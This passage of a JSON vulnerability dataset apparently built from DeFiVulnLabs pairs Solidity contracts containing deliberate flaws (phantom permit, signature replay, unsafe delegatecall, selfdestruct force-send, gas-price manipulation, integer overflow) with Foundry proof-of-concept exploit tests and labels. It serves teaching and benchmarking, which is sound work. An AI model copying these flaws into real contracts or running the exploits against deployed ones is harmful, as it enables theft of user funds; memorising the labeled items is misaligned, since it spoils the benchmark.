    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\n/*\nName: Phantom function - Permit Function \n\nDescription:\nPhantom function: Accepts any call to a function that it doesn't actually define, without reverting.\nkey:\n1.Token that does not support EIP-2612 permit. \n2.Token has a fallback function.\nFor example: WETH.\n\nMitigation:  \nUse SafeERC20's safePermit - Revert on invalid signature.\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol#LL89C14-L89C24\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1671347058568237057\nhttps://media.dedaub.com/phantom-functions-and-the-billion-dollar-no-op-c56f062ae49f\n*/\n\ncontract ContractTest is Test {\n    VulnPermit VulnPermitContract;\n    WETH9 WETH9Contract;\n\n    function setUp() public {\n        WETH9Contract = new WETH9();\n        VulnPermitContract = new VulnPermit(IERC20(address(WETH9Contract)));\n    }\n\n    function testVulnPhantomPermit() public {\n        address alice = vm.addr(1);\n        vm.deal(address(alice), 10 ether);\n\n        vm.startPrank(alice);\n        WETH9Contract.deposit{value: 10 ether}();\n        WETH9Contract.approve(address(VulnPermitContract), type(uint256).max);\n        vm.stopPrank();\n        console.log(\n            \"start WETH balanceOf this\",\n            WETH9Contract.balanceOf(address(this))\n        );\n\n        VulnPermitContract.depositWithPermit(\n            address(alice),\n            1000,\n            27,\n            0x0,\n            0x0\n        );\n        uint wbal = WETH9Contract.balanceOf(address(VulnPermitContract));\n        console.log(\"WETH balanceOf VulnPermitContract\", wbal);\n\n        VulnPermitContract.withdraw(1000);\n\n        wbal = WETH9Contract.balanceOf(address(this));\n        console.log(\"WETH9Contract balanceOf this\", wbal);\n    }\n\n    receive() external payable {}\n}\n\ncontract VulnPermit {\n    IERC20 public token;\n\n    constructor(IERC20 _token) {\n        token = _token;\n    }\n\n    function deposit(uint256 amount) public {\n        require(\n            token.transferFrom(msg.sender, address(this), amount),\n            \"Transfer failed\"\n        );\n    }\n\n    function depositWithPermit(\n        address target,\n        uint256 amount,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) public {\n        (bool success, ) = address(token).call(\n            abi.encodeWithSignature(\n                \"permit(address,uint256,uint8,bytes32,bytes32)\",\n                target,\n                amount,\n                v,\n                r,\n                s\n            )\n        );\n        require(success, \"Permit failed\");\n\n        require(\n            token.transferFrom(target, address(this), amount),\n            \"Transfer failed\"\n        );\n    }\n\n    function withdraw(uint256 amount) public {\n        require(token.transfer(msg.sender, amount), \"Transfer failed\");\n    }\n}\n\n// contract Permit {\n//     IERC20 public token;\n\n//     constructor(IERC20 _token) {\n//         token = _token;\n//     }\n\n//     function deposit(uint256 amount) public {\n//         require(\n//             token.transferFrom(msg.sender, address(this), amount),\n//             \"Transfer failed\"\n//         );\n//     }\n\n//     function depositWithPermit(\n//         address target,\n//         uint256 amount,\n//         uint8 v,\n//         bytes32 r,\n//         bytes32 s\n//     ) public {\n//         (bool success, ) = address(token).call(\n//             abi.encodeWithSignature(\n//                 \"permit(address,uint256,uint8,bytes32,bytes32)\",\n//                 target,\n//                 amount,\n//                 v,\n//                 r,\n//                 s\n//             )\n//         );\n//         require(success, \"Permit failed\");\n\n//         require(\n//             token.transferFrom(target, address(this), amount),\n//             \"Transfer failed\"\n//         );\n//     }\n\n//     function withdraw(uint256 amount) public {\n//         require(token.transfer(msg.sender, amount), \"Transfer failed\");\n//     }\n// }\n\ncontract WETH9 {\n    string public name = \"Wrapped Ether\";\n    string public symbol = \"WETH\";\n    uint8 public decimals = 18;\n\n    event Approval(address indexed src, address indexed guy, uint wad);\n    event Transfer(address indexed src, address indexed dst, uint wad);\n    event Deposit(address indexed dst, uint wad);\n    event Withdrawal(address indexed src, uint wad);\n\n    mapping(address => uint) public balanceOf;\n    mapping(address => mapping(address => uint)) public allowance;\n\n    fallback() external payable {\n        deposit();\n    }\n\n    receive() external payable {}\n\n    function deposit() public payable {\n        balanceOf[msg.sender] += msg.value;\n        emit Deposit(msg.sender, msg.value);\n    }\n\n    function withdraw(uint wad) public {\n        require(balanceOf[msg.sender] >= wad);\n        balanceOf[msg.sender] -= wad;\n        payable(msg.sender).transfer(wad);\n        emit Withdrawal(msg.sender, wad);\n    }\n\n    function totalSupply() public view returns (uint) {\n        return address(this).balance;\n    }\n\n    function approve(address guy, uint wad) public returns (bool) {\n        allowance[msg.sender][guy] = wad;\n        emit Approval(msg.sender, guy, wad);\n        return true;\n    }\n\n    function transfer(address dst, uint wad) public returns (bool) {\n        return transferFrom(msg.sender, dst, wad);\n    }\n\n    function transferFrom(\n        address src,\n        address dst,\n        uint wad\n    ) public returns (bool) {\n        require(balanceOf[src] >= wad);\n\n        if (\n            src != msg.sender && allowance[src][msg.sender] != type(uint128).max\n        ) {\n            require(allowance[src][msg.sender] >= wad);\n            allowance[src][msg.sender] -= wad;\n        }\n\n        balanceOf[src] -= wad;\n        balanceOf[dst] += wad;\n\n        emit Transfer(src, dst, wad);\n\n        return true;\n    }\n}\n",
    "vulnerable_contract_only": "contract VulnPermit {\n    IERC20 public token;\n\n    constructor(IERC20 _token) {\n        token = _token;\n    }\n\n    function deposit(uint256 amount) public {\n        require(\n            token.transferFrom(msg.sender, address(this), amount),\n            \"Transfer failed\"\n        );\n    }\n\n    function depositWithPermit(\n        address target,\n        uint256 amount,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) public {\n        (bool success, ) = address(token).call(\n            abi.encodeWithSignature(\n                \"permit(address,uint256,uint8,bytes32,bytes32)\",\n                target,\n                amount,\n                v,\n                r,\n                s\n            )\n        );\n        require(success, \"Permit failed\");\n\n        require(\n            token.transferFrom(target, address(this), amount),\n            \"Transfer failed\"\n        );\n    }\n\n    function withdraw(uint256 amount) public {\n        require(token.transfer(msg.sender, amount), \"Transfer failed\");\n    }\n}\n\n// ",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "logic_error",
    "severity": "medium",
    "difficulty_tier": 3,
    "vulnerability_name": "Phantom function - Permit Function",
    "description": "Phantom function: Accepts any call to a function that it doesn't actually define, without reverting.\nkey:\n1.Token that does not support EIP-2612 permit. \n2.Token has a fallback function.\nFor example: WETH.",
    "scenario": "",
    "fix_description": "Use SafeERC20's safePermit - Revert on invalid signature.\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol#LL89C14-L89C24",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/phantom-permit.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_signaturereplaynba",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "SignatureReplayNBA.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nWe use NBA NFT incident as an example.\n\n\u2018Association NFT\u2019 collection by the NBA, which triggers the \u2018Allow list\u2019 to sell out permanently. \n\nThis vulnerability could\u2019ve allowed any malicious entity to mint several NFTs without paying any tokens. \n\nThis contract fails to verify that a signature can be used only once.\n*/\ninterface INBA {\n    struct vData {\n        bool mint_free;\n        uint256 max_mint;\n        address from;\n        uint256 start;\n        uint256 end;\n        uint256 eth_price;\n        uint256 dust_price;\n        bytes signature;\n    }\n\n    function mint_approved(\n        vData memory info,\n        uint256 number_of_items_requested,\n        uint16 _batchNumber\n    ) external;\n}\n\ncontract ContractTest is Test {\n    NBA NBAContract;\n\n    function testMintNFT() public {\n        NBAContract = new NBA();\n        // Copy any successful signature from etherscan.\n        // https://etherscan.io/tx/0x0555d3d7a9d1d5659cd99c69f15fb88da57307c3970678fb5e6547879bc548a6\n        INBA.vData memory info = INBA.vData({\n            mint_free: true,\n            max_mint: 1,\n            from: 0x23Bd1adaB0917A2Ed5007aA39e4040487BE2DAd1,\n            start: 0,\n            end: 5555555555,\n            eth_price: 0,\n            dust_price: 0,\n            signature: hex\"b3589c052ba90e14654d1fac78fb2fd9708355e1a686bed502f65e7ac0a47ad722dcc6c0dcc9445f608162648e000dcc8a845c2ed523202465dc9bdd239484b51b\"\n        });\n        INBA(address(NBAContract)).mint_approved(info, 20, 0);\n    }\n\n    receive() external payable {}\n}\n\ncontract NBA is Test {\n    uint16 public batchNumber;\n\n    address signer = 0x669F499e7BA51836BB76F7dD2bc3C1A37a5342D7;\n    struct vData {\n        bool mint_free;\n        uint256 max_mint;\n        address from;\n        uint256 start;\n        uint256 end;\n        uint256 eth_price;\n        uint256 dust_price;\n        bytes signature;\n    }\n\n    function mint_approved(\n        vData memory info,\n        uint256 number_of_items_requested,\n        uint16 _batchNumber\n    ) external view {\n        require(batchNumber == _batchNumber, \"!batch\");\n        // address from = msg.sender;\n        require(verify(info), \"Unauthorised access secret\"); // check whitelist\n        console.log(\n            \"Verified, you are in whitelist! You can mint:\",\n            number_of_items_requested\n        );\n        //_mintCards(number_of_items_requested, from);\n    }\n\n    function verify(vData memory info) public view returns (bool) {\n        require(info.from != address(0), \"INVALID_SIGNER\");\n        bytes memory cat = abi.encode(\n            info.from,\n            info.start,\n            info.end,\n            info.eth_price,\n            info.dust_price,\n            info.max_mint,\n            info.mint_free\n        );\n        // console.log(\"data-->\");\n        // console.logBytes(cat);\n        bytes32 hash = keccak256(cat);\n        // console.log(\"hash ->\");\n        //    console.logBytes32(hash);\n        require(info.signature.length == 65, \"Invalid signature length\");\n        bytes32 sigR;\n        bytes32 sigS;\n        uint8 sigV;\n        bytes memory signature = info.signature;\n        // ecrecover takes the signature parameters, and the only way to get them\n        // currently is to use assembly.\n        assembly {\n            sigR := mload(add(signature, 0x20))\n            sigS := mload(add(signature, 0x40))\n            sigV := byte(0, mload(add(signature, 0x60)))\n        }\n\n        bytes32 data = keccak256(\n            abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", hash)\n        );\n        address recovered = ecrecover(data, sigV, sigR, sigS);\n        return signer == recovered;\n    }\n}\n",
    "vulnerable_contract_only": "contract NBA {\n    uint16 public batchNumber;\n\n    address signer = 0x669F499e7BA51836BB76F7dD2bc3C1A37a5342D7;\n    struct vData {\n        bool mint_free;\n        uint256 max_mint;\n        address from;\n        uint256 start;\n        uint256 end;\n        uint256 eth_price;\n        uint256 dust_price;\n        bytes signature;\n    }\n\n    function mint_approved(\n        vData memory info,\n        uint256 number_of_items_requested,\n        uint16 _batchNumber\n    ) external view {\n        require(batchNumber == _batchNumber, \"!batch\");\n        // address from = msg.sender;\n        require(verify(info), \"Unauthorised access secret\"); // check whitelist\n        console.log(\n            \"Verified, you are in whitelist! You can mint:\",\n            number_of_items_requested\n        );\n        //_mintCards(number_of_items_requested, from);\n    }\n\n    function verify(vData memory info) public view returns (bool) {\n        require(info.from != address(0), \"INVALID_SIGNER\");\n        bytes memory cat = abi.encode(\n            info.from,\n            info.start,\n            info.end,\n            info.eth_price,\n            info.dust_price,\n            info.max_mint,\n            info.mint_free\n        );\n        // console.log(\"data-->\");\n        // console.logBytes(cat);\n        bytes32 hash = keccak256(cat);\n        // console.log(\"hash ->\");\n        //    console.logBytes32(hash);\n        require(info.signature.length == 65, \"Invalid signature length\");\n        bytes32 sigR;\n        bytes32 sigS;\n        uint8 sigV;\n        bytes memory signature = info.signature;\n        // ecrecover takes the signature parameters, and the only way to get them\n        // currently is to use assembly.\n        assembly {\n            sigR := mload(add(signature, 0x20))\n            sigS := mload(add(signature, 0x40))\n            sigV := byte(0, mload(add(signature, 0x60)))\n        }\n\n        bytes32 data = keccak256(\n            abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", hash)\n        );\n        address recovered = ecrecover(data, sigV, sigR, sigS);\n        return signer == recovered;\n    }\n}\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "signature_replay",
    "severity": "high",
    "difficulty_tier": 4,
    "vulnerability_name": "We use NBA NFT incident as an example.",
    "description": "We use NBA NFT incident as an example.",
    "scenario": "",
    "fix_description": "",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/SignatureReplayNBA.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_returnvalue",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Returnvalue.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\n\n/*\nName: Unchecked return value\n\nDescription:\nEIP20 standard:\nReturns a boolean value indicating whether the operation succeeded.\nfunction transfer(address to, uint256 amount) external returns (bool);\n\nUSDT doesn't correctly implement the EIP20 standard,\nso calling these functions with the correct EIP20 function signatures will always revert.\nfunction transfer(address to, uint256 value) external;\n\nERC20 transfer:\n    function transfer(address to, uint256 amount) public virtual returns (bool) {\n        address owner = _msgSender();\n        _transfer(owner, to, amount);\n        return true;\n    }\n\nUSDT transfer without a return value:\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\n        ...\n        }\n        Transfer(msg.sender, _to, sendAmount);\n    }\n\nMitigation:\nUse OpenZeppelin\u2019s\u00a0SafeERC20\u00a0library and change\u00a0transfer\u00a0to\u00a0safeTransfer.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1600868995007410176\n\n*/\ninterface USDT {\n    function transfer(address to, uint256 value) external;\n\n    function balanceOf(address account) external view returns (uint256);\n\n    function approve(address spender, uint256 value) external;\n}\n\ncontract ContractTest is Test {\n    using SafeERC20 for IERC20;\n    IERC20 constant usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);\n\n    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 16138254);\n    }\n\n    function testTransfer() public {\n        vm.startPrank(0xef0DCc839c1490cEbC7209BAa11f46cfe83805ab);\n        usdt.transfer(address(this), 123); //revert\n        vm.stopPrank();\n    }\n\n    function testSafeTransfer() public {\n        vm.startPrank(0xef0DCc839c1490cEbC7209BAa11f46cfe83805ab);\n        usdt.safeTransfer(address(this), 123);\n        vm.stopPrank();\n    }\n\n    receive() external payable {}\n}\n",
    "vulnerable_contract_only": "see full file",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "logic_error",
    "severity": "medium",
    "difficulty_tier": 3,
    "vulnerability_name": "Unchecked return value",
    "description": "EIP20 standard:\nReturns a boolean value indicating whether the operation succeeded.\nfunction transfer(address to, uint256 amount) external returns (bool);\n\nUSDT doesn't correctly implement the EIP20 standard,\nso calling these functions with the correct EIP20 function signatures will always revert.\nfunction transfer(address to, uint256 value) external;\n\nERC20 transfer:\n    function transfer(address to, uint256 amount) public virtual returns (bool) {\n        address owner = _msgSender();\n        _transfer(owner, to, amount);\n        return true;\n    }\n\nUSDT transfer without a return value:\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\n        ...\n        }\n        Transfer(msg.sender, _to, sendAmount);\n    }",
    "scenario": "",
    "fix_description": "Use OpenZeppelin\u2019s\u00a0SafeERC20\u00a0library and change\u00a0transfer\u00a0to\u00a0safeTransfer.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/Returnvalue.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_selfdestruct2",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Selfdestruct2.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nThis excersise is about selfdestructing (deprecated) and force sending ether to a contract\nForce implements neither receive nor fallaback functions. Calls with any value will revert.\n*/\n\ncontract ContractTest is Test {\n    Force ForceContract;\n    Attack AttackerContract;\n\n    function testselfdestruct2() public {\n        ForceContract = new Force();\n        console.log(\"Balance of ForceContract:\", address(ForceContract).balance);\n        AttackerContract = new Attack();\n        console.log(\n            \"Balance of ForceContract:\",\n            address(ForceContract).balance\n        );\n        console.log(\n            \"Balance of AttackerContract:\",\n            address(AttackerContract).balance\n        );\n        AttackerContract.attack{value: 1 ether}(address(ForceContract));\n\n        console.log(\"Exploit completed\");\n        console.log(\n            \"Balance of EtherGameContract:\",\n            address(ForceContract).balance\n        );\n    }\n\n    receive() external payable {}\n}\n\ncontract Force {\n    /*\n\n                   MEOW ?\n         /\\_/\\   /\n    ____/ o o \\\n  /~____  =\u00f8= /\n (______)__m_m)\n\n*/\n}\n\ncontract Attack {\n    function attack(address force) public payable {\n        selfdestruct(payable(force));\n    }\n}\n",
    "vulnerable_contract_only": "contract Force {\n    /*\n\n                   MEOW ?\n         /\\_/\\   /\n    ____/ o o \\\n  /~____  =\u00f8= /\n (______)__m_m)\n\n*/\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "selfdestruct",
    "severity": "critical",
    "difficulty_tier": 2,
    "vulnerability_name": "This excersise is about selfdestructing (deprecated) and force sending ether to a contract",
    "description": "This excersise is about selfdestructing (deprecated) and force sending ether to a contract",
    "scenario": "",
    "fix_description": "",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "src/test/Selfdestruct2.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_delegatecall",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Delegatecall.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Unsafe Delegatecall Vulnerability\n\nDescription:\nThe Proxy Contract Owner Manipulation Vulnerability is a flaw in the smart contract design that\nallows an attacker to manipulate the owner of the Proxy contract, which is hardcoded as 0xdeadbeef.\nThe vulnerability arises due to the use of delegatecall in the fallback function of the Proxy contract. \ndelegatecall allows an attacker to invoke the pwn() function from the Delegate contract within the context \nof the Proxy contract, thereby changing the value of the owner state variable of the Proxy contract.\nThis allows a smart contract to dynamically load code from a different address at runtime.\n\nScenario:\nProxy Contract is designed for helping users call logic contract\nProxy Contract's owner is hardcoded as 0xdeadbeef\nCan you manipulate Proxy Contract's owner ?\n\nMitigation:\nTo mitigate the Proxy Contract Owner Manipulation Vulnerability, \navoid using delegatecall unless it is explicitly required, and ensure that the delegatecall is used securely. \nIf the delegatecall is necessary for the contract's functionality, make sure to validate and \nsanitize inputs to avoid unexpected behaviors.\n*/\n \ncontract Proxy {\n    address public owner = address(0xdeadbeef); // slot0\n    Delegate delegate;\n\n    constructor(address _delegateAddress) public {\n        delegate = Delegate(_delegateAddress);\n    }\n\n    fallback() external {\n        (bool suc, ) = address(delegate).delegatecall(msg.data); // vulnerable\n        require(suc, \"Delegatecall failed\");\n    }\n}\n\ncontract ContractTest is Test {\n    Proxy proxy;\n    Delegate DelegateContract;\n    address alice;\n\n    function setUp() public {\n        alice = vm.addr(1);\n    }\n\n    function testDelegatecall() public {\n        DelegateContract = new Delegate(); // logic contract\n        proxy = new Proxy(address(DelegateContract)); // proxy contract\n\n        console.log(\"Alice address\", alice);\n        console.log(\"DelegationContract owner\", proxy.owner());\n\n        // Delegatecall allows a smart contract to dynamically load code from a different address at runtime.\n        console.log(\"Change DelegationContract owner to Alice...\");\n        vm.prank(alice);\n        address(proxy).call(abi.encodeWithSignature(\"pwn()\")); // exploit here\n        // Proxy.fallback() will delegatecall Delegate.pwn()\n\n        console.log(\"DelegationContract owner\", proxy.owner());\n        console.log(\n            \"Exploit completed, proxy contract storage has been manipulated\"\n        );\n    }\n}\n\ncontract Delegate {\n    address public owner; // slot0\n\n    function pwn() public {\n        owner = msg.sender;\n    }\n}\n",
    "vulnerable_contract_only": "contract Proxy {\n    address public owner = address(0xdeadbeef); // slot0\n    Delegate delegate;\n\n    constructor(address _delegateAddress) public {\n        delegate = Delegate(_delegateAddress);\n    }\n\n    fallback() external {\n        (bool suc, ) = address(delegate).delegatecall(msg.data); // vulnerable\n        require(suc, \"Delegatecall failed\");\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "delegatecall_injection",
    "severity": "critical",
    "difficulty_tier": 3,
    "vulnerability_name": "Unsafe Delegatecall Vulnerability",
    "description": "The Proxy Contract Owner Manipulation Vulnerability is a flaw in the smart contract design that\nallows an attacker to manipulate the owner of the Proxy contract, which is hardcoded as 0xdeadbeef.\nThe vulnerability arises due to the use of delegatecall in the fallback function of the Proxy contract. \ndelegatecall allows an attacker to invoke the pwn() function from the Delegate contract within the context \nof the Proxy contract, thereby changing the value of the owner state variable of the Proxy contract.\nThis allows a smart contract to dynamically load code from a different address at runtime.",
    "scenario": "Proxy Contract is designed for helping users call logic contract\nProxy Contract's owner is hardcoded as 0xdeadbeef\nCan you manipulate Proxy Contract's owner ?",
    "fix_description": "To mitigate the Proxy Contract Owner Manipulation Vulnerability, \navoid using delegatecall unless it is explicitly required, and ensure that the delegatecall is used securely. \nIf the delegatecall is necessary for the contract's functionality, make sure to validate and \nsanitize inputs to avoid unexpected behaviors.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/Delegatecall.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_gas-price",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "gas-price.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: txGasPrice manipulation\n\nDescription:\nManipulation of the txGasPrice value, which can result in unintended consequences and potential financial losses.\n\nIn the calculateTotalFee function, the total fee is calculated by multiplying gasUsed + GAS_OVERHEAD_NATIVE with txGasPrice. \nThe issue is that the txGasPrice value can be manipulated by an attacker, potentially leading to an inflated fee calculation.\n\nMitigation:  \nTo address this vulnerability, it is recommended to implement safeguards such as using a gas oracle to obtain the average gas price from a trusted source. \n\nTest:\nforge test --contracts src/test/gas-price.sol  -vvvv --gas-price 200000000000000\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1678268482641870849\nhttps://github.com/solodit/solodit_content/blob/main/reports/ZachObront/2023-03-21-Alligator.md\nhttps://github.com/solodit/solodit_content/blob/main/reports/Trust%20Security/2023-05-15-Brahma.md\nhttps://blog.pessimistic.io/ethereum-alarm-clock-exploit-final-thoughts-21334987c331\n*/\n\ncontract ContractTest is Test {\n    GasReimbursement GasReimbursementContract;\n\n    function setUp() public {\n        GasReimbursementContract = new GasReimbursement();\n        vm.deal(address(GasReimbursementContract), 100 ether);\n    }\n\n    function testGasRefund() public {\n        uint balanceBefore = address(this).balance;\n        GasReimbursementContract.executeTransfer(address(this));\n        uint balanceAfter = address(this).balance - tx.gasprice; // --gas-price 200000000000000\n        console.log(\"Profit\", balanceAfter - balanceBefore);\n    }\n\n    receive() external payable {}\n}\n\ncontract GasReimbursement {\n    uint public gasUsed = 100000; // Assume gas used is 100,000\n    uint public GAS_OVERHEAD_NATIVE = 500; // Assume native token gas overhead is 500\n\n    // uint public txGasPrice = 20000000000;  // Assume transaction gas price is 20 gwei\n\n    function calculateTotalFee() public view returns (uint) {\n        uint256 totalFee = (gasUsed + GAS_OVERHEAD_NATIVE) * tx.gasprice;\n        return totalFee;\n    }\n\n    function executeTransfer(address recipient) public {\n        uint256 totalFee = calculateTotalFee();\n        _nativeTransferExec(recipient, totalFee);\n    }\n\n    function _nativeTransferExec(address recipient, uint256 amount) internal {\n        payable(recipient).transfer(amount);\n    }\n}\n",
    "vulnerable_contract_only": "contract GasReimbursement {\n    uint public gasUsed = 100000; // Assume gas used is 100,000\n    uint public GAS_OVERHEAD_NATIVE = 500; // Assume native token gas overhead is 500\n\n    // uint public txGasPrice = 20000000000;  // Assume transaction gas price is 20 gwei\n\n    function calculateTotalFee() public view returns (uint) {\n        uint256 totalFee = (gasUsed + GAS_OVERHEAD_NATIVE) * tx.gasprice;\n        return totalFee;\n    }\n\n    function executeTransfer(address recipient) public {\n        uint256 totalFee = calculateTotalFee();\n        _nativeTransferExec(recipient, totalFee);\n    }\n\n    function _nativeTransferExec(address recipient, uint256 amount) internal {\n        payable(recipient).transfer(amount);\n    }\n}\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "oracle_manipulation",
    "severity": "critical",
    "difficulty_tier": 2,
    "vulnerability_name": "txGasPrice manipulation",
    "description": "Manipulation of the txGasPrice value, which can result in unintended consequences and potential financial losses.\n\nIn the calculateTotalFee function, the total fee is calculated by multiplying gasUsed + GAS_OVERHEAD_NATIVE with txGasPrice. \nThe issue is that the txGasPrice value can be manipulated by an attacker, potentially leading to an inflated fee calculation.",
    "scenario": "",
    "fix_description": "To address this vulnerability, it is recommended to implement safeguards such as using a gas oracle to obtain the average gas price from a trusted source. \n\nTest:\nforge test --contracts src/test/gas-price.sol  -vvvv --gas-price 200000000000000",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "src/test/gas-price.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_invariant",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Invariant.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.7.0;\n// this need to be older version of solidity from 0.8.0 solidty compiler checks for overflow and underflow\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Invariant issue\n\nDescription:\nAssert is used to check invariants. Those are states our contract or variables should never reach, ever. For example,\nif we decrease a value then it should never get bigger, only smaller.\n\nIn the given code, the Invariant contract contains a receiveMoney function that accepts Ether and \nincrements the sender's balance with the amount received. This balance is stored as an uint64.\nUnsigned integers can store values from 0 to 2^n - 1, so in this case 2^64 - 1, or roughly 18.4467 Ether.\n\nIf the sender sends more Ether than the maximum that can be stored in an uint64, \nan overflow occurs, and the value rolls over to 0 and starts incrementing from there. \nAs a result, the balance does not accurately reflect the amount of Ether received by the contract.\n\nMitigation:\nTo avoid this problem, it's important to ensure that the types you use for storing values \nare appropriately sized for the values they need to store.\n\nREF:\nhttps://ethereum-blockchain-developer.com/027-exceptions/04-invariants-with-assert/\n\n*/\n\n\ncontract ContractTest is Test {\n    Invariant InvariantContract;\n\n    function testInvariant() public {\n        InvariantContract = new Invariant();\n        InvariantContract.receiveMoney{value: 1 ether}();\n        console.log(\n            \"BalanceReceived:\",\n            InvariantContract.balanceReceived(address(this))\n        );\n\n        InvariantContract.receiveMoney{value: 18 ether}();\n        console.log(\n            \"testInvariant, BalanceReceived:\",\n            InvariantContract.balanceReceived(address(this))\n        );\n        /*\nThat's only 553255926290448384 Wei, or around 0.553 Ether. Where is the rest? What happened?\n\nWe are storing the balance in an uint64. Unsigned integers go from 0 to 2^n-1, \nso that's 2^64-1 or 18446744073709551615. So, it can store a max of 18.4467... \nEther. We sent 19 Ether to the contract. \nIt automatically rolls over to 0. So, we end up with 19000000000000000000 - 18446744073709551615 -1 (the 0 value) = 553255926290448384.\n*/\n    }\n\n    receive() external payable {}\n}\n\ncontract Invariant {\n    mapping(address => uint64) public balanceReceived;\n\n    function receiveMoney() public payable {\n        balanceReceived[msg.sender] += uint64(msg.value);\n    }\n\n    function withdrawMoney(address payable _to, uint64 _amount) public {\n        require(\n            _amount <= balanceReceived[msg.sender],\n            \"Not Enough Funds, aborting\"\n        );\n\n        balanceReceived[msg.sender] -= _amount;\n        _to.transfer(_amount);\n    }\n}\n",
    "vulnerable_contract_only": "contract Invariant {\n    mapping(address => uint64) public balanceReceived;\n\n    function receiveMoney() public payable {\n        balanceReceived[msg.sender] += uint64(msg.value);\n    }\n\n    function withdrawMoney(address payable _to, uint64 _amount) public {\n        require(\n            _amount <= balanceReceived[msg.sender],\n            \"Not Enough Funds, aborting\"\n        );\n\n        balanceReceived[msg.sender] -= _amount;\n        _to.transfer(_amount);\n    }\n}\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "integer_issues",
    "severity": "high",
    "difficulty_tier": 4,
    "vulnerability_name": "Invariant issue",
    "description": "Assert is used to check invariants. Those are states our contract or variables should never reach, ever. For example,\nif we decrease a value then it should never get bigger, only smaller.\n\nIn the given code, the Invariant contract contains a receiveMoney function that accepts Ether and \nincrements the sender's balance with the amount received. This balance is stored as an uint64.\nUnsigned integers can store values from 0 to 2^n - 1, so in this case 2^64 - 1, or roughly 18.4467 Ether.\n\nIf the sender sends more Ether than the maximum that can be stored in an uint64, \nan overflow occurs, and the value rolls over to 0 and starts incrementing from there. \nAs a result, the balance does not accurately reflect the amount of Ether received by the contract.",
    "scenario": "",
    "fix_description": "To avoid this problem, it's important to ensure that the types you use for storing values \nare appropriately sized for the values they need to store.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/Invariant.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_array-deletion",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Array-deletion.sol",
